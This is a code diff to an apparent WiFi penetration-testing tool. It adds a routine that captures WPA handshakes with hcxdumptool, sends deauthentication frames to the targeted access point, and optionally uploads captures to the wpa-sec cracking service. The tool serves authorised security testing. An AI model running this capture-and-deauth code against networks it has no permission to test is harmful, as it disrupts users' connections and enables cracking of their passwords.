@@ -395,13 +395,12 @@ class AttackWPA(Attack):
                 self.view.add_log(f"Error: {str(e)}")
             
             # Try to cleanup interfaces
-            try:
+            import contextlib
+            with contextlib.suppress(Exception):
                 if self.capture_interface:
                     Airmon.stop(self.capture_interface)
                 if self.deauth_interface:
                     Airmon.stop(self.deauth_interface)
-            except:
-                pass
             
             return None
 
@@ -976,8 +975,184 @@ class AttackWPA(Attack):
         
         return handshake
 
+    def _capture_handshake_single_hcxdump(self):
+        """
+        Capture handshake using single interface mode with hcxdumptool.
+        
+        Uses hcxdumptool's built-in deauth capabilities for a single interface,
+        creating .pcapng files that work better with modern cracking tools.
+        
+        Returns:
+            Handshake object if captured, None otherwise
+        """
+        from ..tools.hcxdumptool import HcxDumpTool
+        from ..util.logger import log_info, log_debug, log_error
+        
+        handshake = None
+        
+        # Try to load existing handshake first
+        if not Configuration.ignore_old_handshakes:
+            bssid = self.target.bssid
+            essid = self.target.essid if self.target.essid_known else None
+            handshake = self.load_handshake(bssid=bssid, essid=essid)
+            if handshake:
+                Color.pattack('WPA', self.target, 'Handshake capture',
+                              'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
+                Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
+                return handshake
+        
+        # Configure output file
+        output_file = Configuration.temp('hcxdump_single.pcapng')
+        
+        # Configure deauth based on PMF
+        pmf_required = hasattr(self.target, 'pmf_required') and self.target.pmf_required
+        
+        # Start capture with hcxdumptool
+        with HcxDumpTool(interface=Configuration.interface,
+                        channel=self.target.channel,
+                        target_bssid=self.target.bssid,
+                        output_file=output_file,
+                        enable_deauth=True,  # Use hcxdumptool's built-in deauth
+                        pmf_required=pmf_required) as hcxdump:
+            
+            Color.clear_entire_line()
+            Color.pattack('WPA', self.target, 'Handshake capture', 
+                         'Starting hcxdumptool [HCX]...')
+            
+            log_info('AttackWPA', f'hcxdumptool capture started on {Configuration.interface}')
+            
+            if self.view:
+                self.view.add_log('hcxdumptool capture started')
+            
+            # Initialize timers
+            timeout_timer = Timer(Configuration.wpa_attack_timeout)
+            
+            while handshake is None and not timeout_timer.ended():
+                step_timer = Timer(1)
+                
+                # Update TUI view if available
+                if self.view:
+                    self.view.refresh_if_needed()
+                    self.view.update_progress({
+                        'status': f'Listening for handshake [HCX]',
+                        'metrics': {
+                            'Mode': 'HCX (hcxdumptool)',
+                            'Interface': Configuration.interface,
+                            'Timeout': str(timeout_timer),
+                            'Deauth': 'Built-in' if not pmf_required else 'Disabled (PMF)'
+                        }
+                    })
+                
+                Color.clear_entire_line()
+                Color.pattack('WPA',
+                              self.target,
+                              'Handshake capture',
+                              'Listening [HCX]. (timeout:{R}%s{W})' % timeout_timer)
+                
+                # Check if hcxdumptool is still running
+                if not hcxdump.is_running():
+                    log_error('AttackWPA', 'hcxdumptool process died unexpectedly during capture')
+                    Color.pl('\n{!} {R}hcxdumptool process died unexpectedly{W}')
+                    Color.pl('{!} {O}Check interface and permissions{W}')
+                    if self.view:
+                        self.view.add_log('hcxdumptool process died unexpectedly')
+                    return None
+                
+                # Check if capture file has data
+                if not hcxdump.has_captured_data():
+                    # No data yet, wait
+                    time.sleep(step_timer.remaining())
+                    continue
+                
+                # Check for handshake in the capture file
+                bssid = self.target.bssid
+                essid = self.target.essid if self.target.essid_known else None
+                
+                log_debug('AttackWPA', f'Checking for handshake in hcxdumptool capture (BSSID: {bssid})')
+                
+                handshake = Handshake(output_file, bssid=bssid, essid=essid)
+                if handshake.has_handshake():
+                    # We got a handshake
+                    log_info('AttackWPA', f'Handshake captured successfully for {bssid} [HCX]')
+                    
+                    Color.clear_entire_line()
+                    Color.pattack('WPA',
+                                  self.target,
+                                  'Handshake capture',
+                                  '{G}Captured handshake{W} [HCX]')
+                    Color.pl('')
+                    
+                    # Update TUI view
+                    if self.view:
+                        self.view.add_log('Captured handshake!')
+                        self.view.update_progress({
+                            'status': 'Handshake captured successfully',
+                            'progress': 1.0,
+                            'metrics': {
+                                'Handshake': '✓',
+                                'Mode': 'HCX (hcxdumptool)',
+                                'Interface': Configuration.interface
+                            }
+                        })
+                    
+                    # Upload to wpa-sec if configured
+                    if WpaSecUploader.should_upload():
+                        # hcxdumptool creates .pcapng files which may contain SAE handshakes
+                        capture_type = 'sae' if handshake.capfile.endswith('.pcapng') else 'handshake'
+                        if self.view:
+                            self.view.add_log("Checking wpa-sec upload configuration...")
+                        WpaSecUploader.upload_capture(
+                            handshake.capfile,
+                            self.target.bssid,
+                            self.target.essid,
+                            capture_type=capture_type,
+                            view=self.view
+                        )
+                    
+                    break
+                
+                # No handshake yet
+                handshake = None
+                
+                time.sleep(step_timer.remaining())
+        
+        if handshake is None:
+            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
+                Configuration.wpa_attack_timeout))
+        else:
+            # Save copy of handshake
+            self.save_handshake(handshake)
+        
+        return handshake
+
     def capture_handshake(self):
         """Returns captured or stored handshake, otherwise None."""
+        # Check if hcxdump mode is requested for single interface
+        if Configuration.use_hcxdump:
+            from ..tools.hcxdumptool import HcxDumpTool
+            from ..util.logger import log_info, log_warning, log_debug
+            
+            log_debug('AttackWPA', 'Checking hcxdumptool availability for single interface mode')
+            
+            # Check if hcxdumptool is available
+            if not HcxDumpTool.exists():
+                log_warning('AttackWPA', 'hcxdumptool not found, falling back to airodump-ng')
+                Color.pl('{!} {O}hcxdumptool not found, falling back to airodump-ng{W}')
+            elif not HcxDumpTool.check_minimum_version('6.2.0'):
+                current_version = HcxDumpTool.check_version()
+                log_warning('AttackWPA', f'hcxdumptool version {current_version} is insufficient (need 6.2.0+), falling back to airodump-ng')
+                Color.pl('{!} {O}hcxdumptool version {R}%s{O} is insufficient (need 6.2.0+){W}' % (current_version or 'unknown'))
+                Color.pl('{!} {O}Falling back to airodump-ng{W}')
+            else:
+                # Use hcxdumptool for single interface capture
+                log_info('AttackWPA', 'Using hcxdumptool for single interface capture')
+                Color.pl('{+} {G}Using hcxdumptool for single interface capture{W}')
+                if self.view:
+                    self.view.add_log('Using hcxdumptool mode for capture')
+                    self.view.set_attack_type("WPA Handshake Capture [HCX]")
+                return self._capture_handshake_single_hcxdump()
+        
+        # Default: use airodump-ng
         handshake = None
 
         # First, start Airodump process
